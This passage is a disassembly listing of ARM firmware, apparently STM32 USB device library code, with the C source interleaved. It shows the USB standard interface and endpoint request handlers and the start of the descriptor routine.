 800b6b2:	2bff      	cmp	r3, #255	; 0xff
 800b6b4:	d01d      	beq.n	800b6f2 <USBD_StdItfReq+0x92>
 800b6b6:	7bbb      	ldrb	r3, [r7, #14]
 800b6b8:	2b00      	cmp	r3, #0
 800b6ba:	d11a      	bne.n	800b6f2 <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b6bc:	7bba      	ldrb	r2, [r7, #14]
 800b6be:	687b      	ldr	r3, [r7, #4]
 800b6c0:	32ae      	adds	r2, #174	; 0xae
 800b6c2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6c6:	689b      	ldr	r3, [r3, #8]
 800b6c8:	2b00      	cmp	r3, #0
 800b6ca:	d00f      	beq.n	800b6ec <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b6cc:	7bba      	ldrb	r2, [r7, #14]
 800b6ce:	687b      	ldr	r3, [r7, #4]
 800b6d0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b6d4:	7bba      	ldrb	r2, [r7, #14]
 800b6d6:	687b      	ldr	r3, [r7, #4]
 800b6d8:	32ae      	adds	r2, #174	; 0xae
 800b6da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6de:	689b      	ldr	r3, [r3, #8]
 800b6e0:	6839      	ldr	r1, [r7, #0]
 800b6e2:	6878      	ldr	r0, [r7, #4]
 800b6e4:	4798      	blx	r3
 800b6e6:	4603      	mov	r3, r0
 800b6e8:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b6ea:	e004      	b.n	800b6f6 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b6ec:	2303      	movs	r3, #3
 800b6ee:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b6f0:	e001      	b.n	800b6f6 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b6f2:	2303      	movs	r3, #3
 800b6f4:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b6f6:	683b      	ldr	r3, [r7, #0]
 800b6f8:	88db      	ldrh	r3, [r3, #6]
 800b6fa:	2b00      	cmp	r3, #0
 800b6fc:	d110      	bne.n	800b720 <USBD_StdItfReq+0xc0>
 800b6fe:	7bfb      	ldrb	r3, [r7, #15]
 800b700:	2b00      	cmp	r3, #0
 800b702:	d10d      	bne.n	800b720 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b704:	6878      	ldr	r0, [r7, #4]
 800b706:	f000 fdf1 	bl	800c2ec <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b70a:	e009      	b.n	800b720 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b70c:	6839      	ldr	r1, [r7, #0]
 800b70e:	6878      	ldr	r0, [r7, #4]
 800b710:	f000 fd21 	bl	800c156 <USBD_CtlError>
          break;
 800b714:	e004      	b.n	800b720 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b716:	6839      	ldr	r1, [r7, #0]
 800b718:	6878      	ldr	r0, [r7, #4]
 800b71a:	f000 fd1c 	bl	800c156 <USBD_CtlError>
          break;
 800b71e:	e000      	b.n	800b722 <USBD_StdItfReq+0xc2>
          break;
 800b720:	bf00      	nop
      }
      break;
 800b722:	e004      	b.n	800b72e <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b724:	6839      	ldr	r1, [r7, #0]
 800b726:	6878      	ldr	r0, [r7, #4]
 800b728:	f000 fd15 	bl	800c156 <USBD_CtlError>
      break;
 800b72c:	bf00      	nop
  }

  return ret;
 800b72e:	7bfb      	ldrb	r3, [r7, #15]
}
 800b730:	4618      	mov	r0, r3
 800b732:	3710      	adds	r7, #16
 800b734:	46bd      	mov	sp, r7
 800b736:	bd80      	pop	{r7, pc}

0800b738 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b738:	b580      	push	{r7, lr}
 800b73a:	b084      	sub	sp, #16
 800b73c:	af00      	add	r7, sp, #0
 800b73e:	6078      	str	r0, [r7, #4]
 800b740:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b742:	2300      	movs	r3, #0
 800b744:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b746:	683b      	ldr	r3, [r7, #0]
 800b748:	889b      	ldrh	r3, [r3, #4]
 800b74a:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b74c:	683b      	ldr	r3, [r7, #0]
 800b74e:	781b      	ldrb	r3, [r3, #0]
 800b750:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b754:	2b40      	cmp	r3, #64	; 0x40
 800b756:	d007      	beq.n	800b768 <USBD_StdEPReq+0x30>
 800b758:	2b40      	cmp	r3, #64	; 0x40
 800b75a:	f200 817f 	bhi.w	800ba5c <USBD_StdEPReq+0x324>
 800b75e:	2b00      	cmp	r3, #0
 800b760:	d02a      	beq.n	800b7b8 <USBD_StdEPReq+0x80>
 800b762:	2b20      	cmp	r3, #32
 800b764:	f040 817a 	bne.w	800ba5c <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b768:	7bbb      	ldrb	r3, [r7, #14]
 800b76a:	4619      	mov	r1, r3
 800b76c:	6878      	ldr	r0, [r7, #4]
 800b76e:	f7ff fe82 	bl	800b476 <USBD_CoreFindEP>
 800b772:	4603      	mov	r3, r0
 800b774:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b776:	7b7b      	ldrb	r3, [r7, #13]
 800b778:	2bff      	cmp	r3, #255	; 0xff
 800b77a:	f000 8174 	beq.w	800ba66 <USBD_StdEPReq+0x32e>
 800b77e:	7b7b      	ldrb	r3, [r7, #13]
 800b780:	2b00      	cmp	r3, #0
 800b782:	f040 8170 	bne.w	800ba66 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b786:	7b7a      	ldrb	r2, [r7, #13]
 800b788:	687b      	ldr	r3, [r7, #4]
 800b78a:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b78e:	7b7a      	ldrb	r2, [r7, #13]
 800b790:	687b      	ldr	r3, [r7, #4]
 800b792:	32ae      	adds	r2, #174	; 0xae
 800b794:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b798:	689b      	ldr	r3, [r3, #8]
 800b79a:	2b00      	cmp	r3, #0
 800b79c:	f000 8163 	beq.w	800ba66 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b7a0:	7b7a      	ldrb	r2, [r7, #13]
 800b7a2:	687b      	ldr	r3, [r7, #4]
 800b7a4:	32ae      	adds	r2, #174	; 0xae
 800b7a6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7aa:	689b      	ldr	r3, [r3, #8]
 800b7ac:	6839      	ldr	r1, [r7, #0]
 800b7ae:	6878      	ldr	r0, [r7, #4]
 800b7b0:	4798      	blx	r3
 800b7b2:	4603      	mov	r3, r0
 800b7b4:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b7b6:	e156      	b.n	800ba66 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7b8:	683b      	ldr	r3, [r7, #0]
 800b7ba:	785b      	ldrb	r3, [r3, #1]
 800b7bc:	2b03      	cmp	r3, #3
 800b7be:	d008      	beq.n	800b7d2 <USBD_StdEPReq+0x9a>
 800b7c0:	2b03      	cmp	r3, #3
 800b7c2:	f300 8145 	bgt.w	800ba50 <USBD_StdEPReq+0x318>
 800b7c6:	2b00      	cmp	r3, #0
 800b7c8:	f000 809b 	beq.w	800b902 <USBD_StdEPReq+0x1ca>
 800b7cc:	2b01      	cmp	r3, #1
 800b7ce:	d03c      	beq.n	800b84a <USBD_StdEPReq+0x112>
 800b7d0:	e13e      	b.n	800ba50 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b7d2:	687b      	ldr	r3, [r7, #4]
 800b7d4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b7d8:	b2db      	uxtb	r3, r3
 800b7da:	2b02      	cmp	r3, #2
 800b7dc:	d002      	beq.n	800b7e4 <USBD_StdEPReq+0xac>
 800b7de:	2b03      	cmp	r3, #3
 800b7e0:	d016      	beq.n	800b810 <USBD_StdEPReq+0xd8>
 800b7e2:	e02c      	b.n	800b83e <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b7e4:	7bbb      	ldrb	r3, [r7, #14]
 800b7e6:	2b00      	cmp	r3, #0
 800b7e8:	d00d      	beq.n	800b806 <USBD_StdEPReq+0xce>
 800b7ea:	7bbb      	ldrb	r3, [r7, #14]
 800b7ec:	2b80      	cmp	r3, #128	; 0x80
 800b7ee:	d00a      	beq.n	800b806 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b7f0:	7bbb      	ldrb	r3, [r7, #14]
 800b7f2:	4619      	mov	r1, r3
 800b7f4:	6878      	ldr	r0, [r7, #4]
 800b7f6:	f001 fa21 	bl	800cc3c <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b7fa:	2180      	movs	r1, #128	; 0x80
 800b7fc:	6878      	ldr	r0, [r7, #4]
 800b7fe:	f001 fa1d 	bl	800cc3c <USBD_LL_StallEP>
 800b802:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b804:	e020      	b.n	800b848 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b806:	6839      	ldr	r1, [r7, #0]
 800b808:	6878      	ldr	r0, [r7, #4]
 800b80a:	f000 fca4 	bl	800c156 <USBD_CtlError>
              break;
 800b80e:	e01b      	b.n	800b848 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b810:	683b      	ldr	r3, [r7, #0]
 800b812:	885b      	ldrh	r3, [r3, #2]
 800b814:	2b00      	cmp	r3, #0
 800b816:	d10e      	bne.n	800b836 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b818:	7bbb      	ldrb	r3, [r7, #14]
 800b81a:	2b00      	cmp	r3, #0
 800b81c:	d00b      	beq.n	800b836 <USBD_StdEPReq+0xfe>
 800b81e:	7bbb      	ldrb	r3, [r7, #14]
 800b820:	2b80      	cmp	r3, #128	; 0x80
 800b822:	d008      	beq.n	800b836 <USBD_StdEPReq+0xfe>
 800b824:	683b      	ldr	r3, [r7, #0]
 800b826:	88db      	ldrh	r3, [r3, #6]
 800b828:	2b00      	cmp	r3, #0
 800b82a:	d104      	bne.n	800b836 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b82c:	7bbb      	ldrb	r3, [r7, #14]
 800b82e:	4619      	mov	r1, r3
 800b830:	6878      	ldr	r0, [r7, #4]
 800b832:	f001 fa03 	bl	800cc3c <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b836:	6878      	ldr	r0, [r7, #4]
 800b838:	f000 fd58 	bl	800c2ec <USBD_CtlSendStatus>

              break;
 800b83c:	e004      	b.n	800b848 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b83e:	6839      	ldr	r1, [r7, #0]
 800b840:	6878      	ldr	r0, [r7, #4]
 800b842:	f000 fc88 	bl	800c156 <USBD_CtlError>
              break;
 800b846:	bf00      	nop
          }
          break;
 800b848:	e107      	b.n	800ba5a <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b84a:	687b      	ldr	r3, [r7, #4]
 800b84c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b850:	b2db      	uxtb	r3, r3
 800b852:	2b02      	cmp	r3, #2
 800b854:	d002      	beq.n	800b85c <USBD_StdEPReq+0x124>
 800b856:	2b03      	cmp	r3, #3
 800b858:	d016      	beq.n	800b888 <USBD_StdEPReq+0x150>
 800b85a:	e04b      	b.n	800b8f4 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b85c:	7bbb      	ldrb	r3, [r7, #14]
 800b85e:	2b00      	cmp	r3, #0
 800b860:	d00d      	beq.n	800b87e <USBD_StdEPReq+0x146>
 800b862:	7bbb      	ldrb	r3, [r7, #14]
 800b864:	2b80      	cmp	r3, #128	; 0x80
 800b866:	d00a      	beq.n	800b87e <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b868:	7bbb      	ldrb	r3, [r7, #14]
 800b86a:	4619      	mov	r1, r3
 800b86c:	6878      	ldr	r0, [r7, #4]
 800b86e:	f001 f9e5 	bl	800cc3c <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b872:	2180      	movs	r1, #128	; 0x80
 800b874:	6878      	ldr	r0, [r7, #4]
 800b876:	f001 f9e1 	bl	800cc3c <USBD_LL_StallEP>
 800b87a:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b87c:	e040      	b.n	800b900 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b87e:	6839      	ldr	r1, [r7, #0]
 800b880:	6878      	ldr	r0, [r7, #4]
 800b882:	f000 fc68 	bl	800c156 <USBD_CtlError>
              break;
 800b886:	e03b      	b.n	800b900 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b888:	683b      	ldr	r3, [r7, #0]
 800b88a:	885b      	ldrh	r3, [r3, #2]
 800b88c:	2b00      	cmp	r3, #0
 800b88e:	d136      	bne.n	800b8fe <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b890:	7bbb      	ldrb	r3, [r7, #14]
 800b892:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b896:	2b00      	cmp	r3, #0
 800b898:	d004      	beq.n	800b8a4 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b89a:	7bbb      	ldrb	r3, [r7, #14]
 800b89c:	4619      	mov	r1, r3
 800b89e:	6878      	ldr	r0, [r7, #4]
 800b8a0:	f001 fa02 	bl	800cca8 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b8a4:	6878      	ldr	r0, [r7, #4]
 800b8a6:	f000 fd21 	bl	800c2ec <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b8aa:	7bbb      	ldrb	r3, [r7, #14]
 800b8ac:	4619      	mov	r1, r3
 800b8ae:	6878      	ldr	r0, [r7, #4]
 800b8b0:	f7ff fde1 	bl	800b476 <USBD_CoreFindEP>
 800b8b4:	4603      	mov	r3, r0
 800b8b6:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8b8:	7b7b      	ldrb	r3, [r7, #13]
 800b8ba:	2bff      	cmp	r3, #255	; 0xff
 800b8bc:	d01f      	beq.n	800b8fe <USBD_StdEPReq+0x1c6>
 800b8be:	7b7b      	ldrb	r3, [r7, #13]
 800b8c0:	2b00      	cmp	r3, #0
 800b8c2:	d11c      	bne.n	800b8fe <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b8c4:	7b7a      	ldrb	r2, [r7, #13]
 800b8c6:	687b      	ldr	r3, [r7, #4]
 800b8c8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b8cc:	7b7a      	ldrb	r2, [r7, #13]
 800b8ce:	687b      	ldr	r3, [r7, #4]
 800b8d0:	32ae      	adds	r2, #174	; 0xae
 800b8d2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8d6:	689b      	ldr	r3, [r3, #8]
 800b8d8:	2b00      	cmp	r3, #0
 800b8da:	d010      	beq.n	800b8fe <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b8dc:	7b7a      	ldrb	r2, [r7, #13]
 800b8de:	687b      	ldr	r3, [r7, #4]
 800b8e0:	32ae      	adds	r2, #174	; 0xae
 800b8e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8e6:	689b      	ldr	r3, [r3, #8]
 800b8e8:	6839      	ldr	r1, [r7, #0]
 800b8ea:	6878      	ldr	r0, [r7, #4]
 800b8ec:	4798      	blx	r3
 800b8ee:	4603      	mov	r3, r0
 800b8f0:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b8f2:	e004      	b.n	800b8fe <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b8f4:	6839      	ldr	r1, [r7, #0]
 800b8f6:	6878      	ldr	r0, [r7, #4]
 800b8f8:	f000 fc2d 	bl	800c156 <USBD_CtlError>
              break;
 800b8fc:	e000      	b.n	800b900 <USBD_StdEPReq+0x1c8>
              break;
 800b8fe:	bf00      	nop
          }
          break;
 800b900:	e0ab      	b.n	800ba5a <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b902:	687b      	ldr	r3, [r7, #4]
 800b904:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b908:	b2db      	uxtb	r3, r3
 800b90a:	2b02      	cmp	r3, #2
 800b90c:	d002      	beq.n	800b914 <USBD_StdEPReq+0x1dc>
 800b90e:	2b03      	cmp	r3, #3
 800b910:	d032      	beq.n	800b978 <USBD_StdEPReq+0x240>
 800b912:	e097      	b.n	800ba44 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b914:	7bbb      	ldrb	r3, [r7, #14]
 800b916:	2b00      	cmp	r3, #0
 800b918:	d007      	beq.n	800b92a <USBD_StdEPReq+0x1f2>
 800b91a:	7bbb      	ldrb	r3, [r7, #14]
 800b91c:	2b80      	cmp	r3, #128	; 0x80
 800b91e:	d004      	beq.n	800b92a <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b920:	6839      	ldr	r1, [r7, #0]
 800b922:	6878      	ldr	r0, [r7, #4]
 800b924:	f000 fc17 	bl	800c156 <USBD_CtlError>
                break;
 800b928:	e091      	b.n	800ba4e <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b92a:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b92e:	2b00      	cmp	r3, #0
 800b930:	da0b      	bge.n	800b94a <USBD_StdEPReq+0x212>
 800b932:	7bbb      	ldrb	r3, [r7, #14]
 800b934:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b938:	4613      	mov	r3, r2
 800b93a:	009b      	lsls	r3, r3, #2
 800b93c:	4413      	add	r3, r2
 800b93e:	009b      	lsls	r3, r3, #2
 800b940:	3310      	adds	r3, #16
 800b942:	687a      	ldr	r2, [r7, #4]
 800b944:	4413      	add	r3, r2
 800b946:	3304      	adds	r3, #4
 800b948:	e00b      	b.n	800b962 <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b94a:	7bbb      	ldrb	r3, [r7, #14]
 800b94c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b950:	4613      	mov	r3, r2
 800b952:	009b      	lsls	r3, r3, #2
 800b954:	4413      	add	r3, r2
 800b956:	009b      	lsls	r3, r3, #2
 800b958:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b95c:	687a      	ldr	r2, [r7, #4]
 800b95e:	4413      	add	r3, r2
 800b960:	3304      	adds	r3, #4
 800b962:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b964:	68bb      	ldr	r3, [r7, #8]
 800b966:	2200      	movs	r2, #0
 800b968:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b96a:	68bb      	ldr	r3, [r7, #8]
 800b96c:	2202      	movs	r2, #2
 800b96e:	4619      	mov	r1, r3
 800b970:	6878      	ldr	r0, [r7, #4]
 800b972:	f000 fc61 	bl	800c238 <USBD_CtlSendData>
              break;
 800b976:	e06a      	b.n	800ba4e <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800b978:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b97c:	2b00      	cmp	r3, #0
 800b97e:	da11      	bge.n	800b9a4 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800b980:	7bbb      	ldrb	r3, [r7, #14]
 800b982:	f003 020f 	and.w	r2, r3, #15
 800b986:	6879      	ldr	r1, [r7, #4]
 800b988:	4613      	mov	r3, r2
 800b98a:	009b      	lsls	r3, r3, #2
 800b98c:	4413      	add	r3, r2
 800b98e:	009b      	lsls	r3, r3, #2
 800b990:	440b      	add	r3, r1
 800b992:	3324      	adds	r3, #36	; 0x24
 800b994:	881b      	ldrh	r3, [r3, #0]
 800b996:	2b00      	cmp	r3, #0
 800b998:	d117      	bne.n	800b9ca <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b99a:	6839      	ldr	r1, [r7, #0]
 800b99c:	6878      	ldr	r0, [r7, #4]
 800b99e:	f000 fbda 	bl	800c156 <USBD_CtlError>
                  break;
 800b9a2:	e054      	b.n	800ba4e <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800b9a4:	7bbb      	ldrb	r3, [r7, #14]
 800b9a6:	f003 020f 	and.w	r2, r3, #15
 800b9aa:	6879      	ldr	r1, [r7, #4]
 800b9ac:	4613      	mov	r3, r2
 800b9ae:	009b      	lsls	r3, r3, #2
 800b9b0:	4413      	add	r3, r2
 800b9b2:	009b      	lsls	r3, r3, #2
 800b9b4:	440b      	add	r3, r1
 800b9b6:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800b9ba:	881b      	ldrh	r3, [r3, #0]
 800b9bc:	2b00      	cmp	r3, #0
 800b9be:	d104      	bne.n	800b9ca <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9c0:	6839      	ldr	r1, [r7, #0]
 800b9c2:	6878      	ldr	r0, [r7, #4]
 800b9c4:	f000 fbc7 	bl	800c156 <USBD_CtlError>
                  break;
 800b9c8:	e041      	b.n	800ba4e <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9ca:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9ce:	2b00      	cmp	r3, #0
 800b9d0:	da0b      	bge.n	800b9ea <USBD_StdEPReq+0x2b2>
 800b9d2:	7bbb      	ldrb	r3, [r7, #14]
 800b9d4:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b9d8:	4613      	mov	r3, r2
 800b9da:	009b      	lsls	r3, r3, #2
 800b9dc:	4413      	add	r3, r2
 800b9de:	009b      	lsls	r3, r3, #2
 800b9e0:	3310      	adds	r3, #16
 800b9e2:	687a      	ldr	r2, [r7, #4]
 800b9e4:	4413      	add	r3, r2
 800b9e6:	3304      	adds	r3, #4
 800b9e8:	e00b      	b.n	800ba02 <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b9ea:	7bbb      	ldrb	r3, [r7, #14]
 800b9ec:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9f0:	4613      	mov	r3, r2
 800b9f2:	009b      	lsls	r3, r3, #2
 800b9f4:	4413      	add	r3, r2
 800b9f6:	009b      	lsls	r3, r3, #2
 800b9f8:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b9fc:	687a      	ldr	r2, [r7, #4]
 800b9fe:	4413      	add	r3, r2
 800ba00:	3304      	adds	r3, #4
 800ba02:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba04:	7bbb      	ldrb	r3, [r7, #14]
 800ba06:	2b00      	cmp	r3, #0
 800ba08:	d002      	beq.n	800ba10 <USBD_StdEPReq+0x2d8>
 800ba0a:	7bbb      	ldrb	r3, [r7, #14]
 800ba0c:	2b80      	cmp	r3, #128	; 0x80
 800ba0e:	d103      	bne.n	800ba18 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba10:	68bb      	ldr	r3, [r7, #8]
 800ba12:	2200      	movs	r2, #0
 800ba14:	601a      	str	r2, [r3, #0]
 800ba16:	e00e      	b.n	800ba36 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800ba18:	7bbb      	ldrb	r3, [r7, #14]
 800ba1a:	4619      	mov	r1, r3
 800ba1c:	6878      	ldr	r0, [r7, #4]
 800ba1e:	f001 f979 	bl	800cd14 <USBD_LL_IsStallEP>
 800ba22:	4603      	mov	r3, r0
 800ba24:	2b00      	cmp	r3, #0
 800ba26:	d003      	beq.n	800ba30 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800ba28:	68bb      	ldr	r3, [r7, #8]
 800ba2a:	2201      	movs	r2, #1
 800ba2c:	601a      	str	r2, [r3, #0]
 800ba2e:	e002      	b.n	800ba36 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800ba30:	68bb      	ldr	r3, [r7, #8]
 800ba32:	2200      	movs	r2, #0
 800ba34:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800ba36:	68bb      	ldr	r3, [r7, #8]
 800ba38:	2202      	movs	r2, #2
 800ba3a:	4619      	mov	r1, r3
 800ba3c:	6878      	ldr	r0, [r7, #4]
 800ba3e:	f000 fbfb 	bl	800c238 <USBD_CtlSendData>
              break;
 800ba42:	e004      	b.n	800ba4e <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800ba44:	6839      	ldr	r1, [r7, #0]
 800ba46:	6878      	ldr	r0, [r7, #4]
 800ba48:	f000 fb85 	bl	800c156 <USBD_CtlError>
              break;
 800ba4c:	bf00      	nop
          }
          break;
 800ba4e:	e004      	b.n	800ba5a <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800ba50:	6839      	ldr	r1, [r7, #0]
 800ba52:	6878      	ldr	r0, [r7, #4]
 800ba54:	f000 fb7f 	bl	800c156 <USBD_CtlError>
          break;
 800ba58:	bf00      	nop
      }
      break;
 800ba5a:	e005      	b.n	800ba68 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800ba5c:	6839      	ldr	r1, [r7, #0]
 800ba5e:	6878      	ldr	r0, [r7, #4]
 800ba60:	f000 fb79 	bl	800c156 <USBD_CtlError>
      break;
 800ba64:	e000      	b.n	800ba68 <USBD_StdEPReq+0x330>
      break;
 800ba66:	bf00      	nop
  }

  return ret;
 800ba68:	7bfb      	ldrb	r3, [r7, #15]
}
 800ba6a:	4618      	mov	r0, r3
 800ba6c:	3710      	adds	r7, #16
 800ba6e:	46bd      	mov	sp, r7
 800ba70:	bd80      	pop	{r7, pc}
	...

0800ba74 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800ba74:	b580      	push	{r7, lr}
 800ba76:	b084      	sub	sp, #16
 800ba78:	af00      	add	r7, sp, #0
 800ba7a:	6078      	str	r0, [r7, #4]
 800ba7c:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800ba7e:	2300      	movs	r3, #0
 800ba80:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
